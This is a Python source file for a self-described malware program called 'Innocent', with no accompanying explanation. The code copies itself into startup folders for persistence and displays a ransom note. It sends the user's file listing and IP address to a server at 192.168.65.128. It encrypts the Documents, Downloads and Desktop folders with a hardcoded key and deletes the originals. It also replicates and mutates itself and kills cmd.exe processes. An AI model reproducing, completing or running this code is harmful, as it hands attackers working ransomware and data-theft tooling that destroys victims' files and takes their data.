import os
import platform
import random
import string
import subprocess
import shutil
import requests
import ctypes
import socket
import sys
from cryptography.fernet import Fernet

class Innocent:
    def __init__(self):
        self.target_os = platform.system().lower()
        self.mutation_count = 0
        self.encryption_key = b'3XO8Q-BBRu5F3z0wNJZBfUnE8HS3hbFzctujlbp7qV0='  # Replace with your actual generated key
        self.cipher = Fernet(self.encryption_key)
        self.message_displayed = False  # Flag to check if the message has been displayed

    def infect(self):
        try:
            print(f"Infecting {self.target_os} system...")  # execute during startup
            if self.target_os == "windows":
                startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            elif self.target_os in ["linux", "darwin"]:
                startup_dir = os.path.expanduser('~/.config/autostart/')
            else:
                print("Unsupported OS")
                return

            if not os.path.exists(startup_dir):
                os.makedirs(startup_dir)

            if getattr(sys, 'frozen', False):
                # Running as an executable
                self_path = sys.executable
            else:
                # Running as a script
                self_path = os.path.realpath(__file__)

            destination = os.path.join(startup_dir, os.path.basename(self_path))
            shutil.copyfile(self_path, destination)
            print(f"Copied to {destination}")
        except Exception as e:
            print(f"Error during infection: {e}")

    def display_message(self):
        # Only display the message if it hasn't been displayed yet
        if not self.message_displayed:
            try:
                print("Displaying warning message...")
                message = """*** WARNING: You Have Been Infected by Innocent ***

Your system is now under the control of Innocent. Your files, data, and privacy are at risk.
Any attempts to remove or alter this malware will result in immediate data loss.

You are advised to contact us within 48 hours to negotiate the safety of your data.
Failure to comply will result in the irreversible deletion of critical information.

Be warned: Innocent is elusive and adaptive.
"""
                if self.target_os == "windows":
                    ctypes.windll.user32.MessageBoxW(0, message, "Infection Warning", 1)
                elif self.target_os in ["linux", "darwin"]:
                    subprocess.run(['zenity', '--warning', '--text', message])
                else:
                    print("Unsupported OS")
                
                self.message_displayed = True  # Set the flag to True after displaying the message
            except Exception as e:
                print(f"Error displaying message: {e}")

    def mutate(self):
        try:
            print("Mutating...")
            self.mutation_count += 1
            mutation_id = ''.join(random.choices(string.ascii_lowercase, k=8))
            mutated_code = self._get_self_code().replace('Innocent', f'Innocent_{mutation_id}')
            mutated_filename = f'innocent_{mutation_id}.py'

            with open(mutated_filename, 'w') as file:
                file.write(mutated_code)

            subprocess.run(['python', mutated_filename])
            os.remove(mutated_filename)
        except Exception as e:
            print(f"Error during mutation: {e}")

    def duplicate_self(self):
        try:
            # Create a random name for the duplicated file
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".py"
            # Duplicate the file in the same directory
            duplicate_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), random_name)
            shutil.copyfile(sys.argv[0], duplicate_path)
            print(f"Duplicated itself as {duplicate_path}")

            # Run the duplicated file
            subprocess.Popen(['python', duplicate_path])
        except Exception as e:
            print(f"Error during duplication: {e}")

    def hide_process(self):
        try:
            if self.target_os == "windows":
                # Use 'taskkill' to hide the process by killing visible processes
                subprocess.run("taskkill /F /IM cmd.exe", shell=True)
            elif self.target_os in ["linux", "darwin"]:
                # Hiding process in Linux/Mac is more complex and requires root privileges
                pass
        except Exception as e:
            print(f"Error hiding process: {e}")

    def exfiltrate_data(self):
        try:
            print("Exfiltrating data...")
            if self.target_os == "windows":
                command = "dir %USERPROFILE%\\Documents"
            else:
                command = "ls ~"

            files = subprocess.getoutput(command)
            ip_address = self._get_ip_address()
            data_to_exfiltrate = f"Files:\n{files}\n\nIP Address:\n{ip_address}"
            self._send_data_to_server(data_to_exfiltrate)
        except Exception as e:
            print(f"Error during data exfiltration: {e}")

    def encrypt_files(self):
        try:
            if self.target_os == "windows":
                directories = [
                    os.path.join(os.getenv('USERPROFILE'), 'Documents'),
                    os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
                    os.path.join(os.getenv('USERPROFILE'), 'Desktop')
                ]
            else:
                print("Encryption is only supported on Windows.")
                return

            for directory in directories:
                if os.path.exists(directory):
                    print(f"Encrypting files in {directory}...")
                    for root, _, files in os.walk(directory):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if not file.endswith('.encrypted'):  # Skip already encrypted files
                                try:
                                    with open(file_path, 'rb') as original_file:
                                        original_data = original_file.read()

                                    encrypted_data = self.cipher.encrypt(original_data)
                                    encrypted_file_path = file_path + '.encrypted'
                                    with open(encrypted_file_path, 'wb') as encrypted_file:
                                        encrypted_file.write(encrypted_data)

                                    os.remove(file_path)  # Remove the original file
                                    print(f"Encrypted {file_path} to {encrypted_file_path}")
                                except Exception as e:
                                    print(f"Error encrypting {file_path}: {e}")
                else:
                    print(f"Directory {directory} does not exist or is inaccessible.")
        except Exception as e:
            print(f"Error during encryption: {e}")

    def _get_ip_address(self):
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            return ip_address
        except Exception as e:
            print(f"Error retrieving IP address: {e}")
            return "Unable to retrieve IP address"

    def _send_data_to_server(self, data):
        url = "http://192.168.65.128:8080/exfiltrate"  # Replace with the actual IP of your server
        try:
            response = requests.post(url, data={"data": data})
            print(f"Data exfiltration {'succeeded' if response.status_code == 200 else 'failed'}")
        except requests.exceptions.RequestException as e:
            print(f"Error during data exfiltration: {e}")

    def _get_self_code(self):
        try:
            if getattr(sys, 'frozen', False):
                # Running in a PyInstaller bundle
                with open(sys.executable, 'rb') as file:
                    return file.read().decode('utf-8', errors='ignore')
            else:
                # Running as a script
                with open(__file__, 'r') as file:
                    return file.read()
        except Exception as e:
            print(f"Error reading self code: {e}")
            return ""

    def run(self):
        try:
            self.infect()
            self.display_message()
            self.exfiltrate_data()
            self.encrypt_files()
            self.duplicate_self()
            self.mutate()
            self.hide_process()
            print("Malware is running...")
        except Exception as e:
            print(f"Error during execution: {e}")

if __name__ == "__main__":
    malware = Innocent()
    malware.run()




